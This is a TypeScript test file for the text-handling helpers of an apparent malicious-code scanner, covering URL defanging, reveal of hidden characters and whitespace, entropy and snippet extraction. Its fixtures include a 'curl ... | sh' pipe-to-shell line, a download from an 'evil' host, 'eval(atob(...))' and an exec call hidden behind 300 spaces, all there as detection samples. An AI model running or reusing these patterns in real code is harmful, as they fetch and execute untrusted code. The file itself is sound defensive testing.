import { describe, expect, it } from "vitest";

import {
  SCAN_WINDOW,
  decode,
  defang,
  isDocPath,
  isSourcePath,
  iterScanLines,
  revealHidden,
  sanitize,
  shannonEntropy,
  snippet,
  splitLines,
} from "../src/engine/text";

const RLO = String.fromCodePoint(0x202e);
const LINE_SEPARATOR = String.fromCodePoint(0x2028);
const VARIATION_SELECTOR = String.fromCodePoint(0xfe01);

describe("splitLines", () => {
  it("splits only on \\n and \\r\\n", () => {
    expect(splitLines("a\nb\r\nc")).toEqual(["a", "b", "c"]);
    expect(splitLines(`a\vb\fc${LINE_SEPARATOR}d\n`)).toEqual([`a\vb\fc${LINE_SEPARATOR}d`]);
    expect(splitLines("")).toEqual([]);
    expect(splitLines("\n")).toEqual([""]);
  });
});

describe("iterScanLines", () => {
  it("windows long lines with overlap so nothing is missed", () => {
    const line = "x".repeat(SCAN_WINDOW * 2 + 5);
    const windows = [...iterScanLines(`${line}\nshort`)];
    expect(windows.filter((w) => w.line === 1).length).toBeGreaterThan(2);
    expect(windows.at(-1)).toEqual({ line: 2, text: "short" });
    expect(windows.every((w) => w.text.length <= SCAN_WINDOW)).toBe(true);
  });
});

describe("entropy", () => {
  it("is 0 for uniform text and high for random-looking text", () => {
    expect(shannonEntropy("aaaa")).toBe(0);
    expect(shannonEntropy("")).toBe(0);
    expect(shannonEntropy("abcdefghijklmnop")).toBe(4);
  });
});

describe("doc and source paths", () => {
  it("decides by file type, never by directory", () => {
    expect(isDocPath("README.md")).toBe(true);
    expect(isDocPath("docs/guide.rst")).toBe(true);
    expect(isDocPath("readme.txt")).toBe(true);
    expect(isDocPath("docs/install.sh")).toBe(false);
    expect(isDocPath("notes.txt")).toBe(false);
    expect(isSourcePath("src/a.py")).toBe(true);
    expect(isSourcePath("README.md")).toBe(false);
    expect(isSourcePath("Makefile")).toBe(false);
  });
});

describe("decode", () => {
  it("treats NUL bytes as binary", () => {
    expect(decode(new Uint8Array([0x4d, 0x5a, 0x00, 0x01]))).toBeNull();
  });

  it("decodes UTF-16 files with a byte order mark instead of skipping them", () => {
    const le = new Uint8Array([0xff, 0xfe, 0x69, 0x00, 0x65, 0x00, 0x78, 0x00]);
    const be = new Uint8Array([0xfe, 0xff, 0x00, 0x69, 0x00, 0x65, 0x00, 0x78]);
    expect(decode(le)).toEqual({ text: "iex", utf16: true });
    expect(decode(be)).toEqual({ text: "iex", utf16: true });
  });
});

describe("defang", () => {
  it("makes URLs non-clickable", () => {
    expect(defang("get https://evil.example.com/x.exe now")).toBe("get hxxps://evil[.]example[.]com/x.exe now");
    expect(defang("HTTP://a.b")).toBe("HxxP://a[.]b");
    expect(defang("ftp://a.b/c")).toBe("fxp://a.b/c");
  });
});

describe("revealing hidden characters", () => {
  it("marks bidi overrides and control characters", () => {
    expect(sanitize(`a${RLO}b`)).toBe("a[U+202E]b");
    expect(sanitize("x\x1b[2Jy")).toBe("x[U+001B][2Jy");
    expect(sanitize(`v${VARIATION_SELECTOR.repeat(40)}`)).toBe("v[U+FE01 x40]");
  });

  it("collapses long whitespace runs and keeps the column on the hidden code", () => {
    const line = `import os${" ".repeat(300)};exec(x)`;
    const { text, column } = revealHidden(line, line.indexOf(";exec"));
    expect(text).toBe("import os[... 300 spaces ...];exec(x)");
    expect(text.slice(column)).toBe(";exec(x)");
  });

  it("replaces lone surrogates from broken file names", () => {
    expect(sanitize(`a${String.fromCharCode(0xd800)}b`)).toBe(`a${String.fromCodePoint(0xfffd)}b`);
  });

  it("bounds the length", () => {
    expect(sanitize("x".repeat(500), 10)).toHaveLength(10);
  });
});

describe("snippet", () => {
  it("centres long lines on the match", () => {
    const line = `${"a".repeat(5000)}eval(atob("x"))${"b".repeat(5000)}`;
    const s = snippet(line, 5000);
    expect(s).toContain('eval(atob("x"))');
    expect(s.startsWith("…")).toBe(true);
    expect(s.length).toBeLessThanOrEqual(200);
  });

  it("defangs URLs and trims", () => {
    expect(snippet("   curl https://x.example/a | sh  ")).toBe("curl hxxps://x[.]example/a | sh");
  });
});
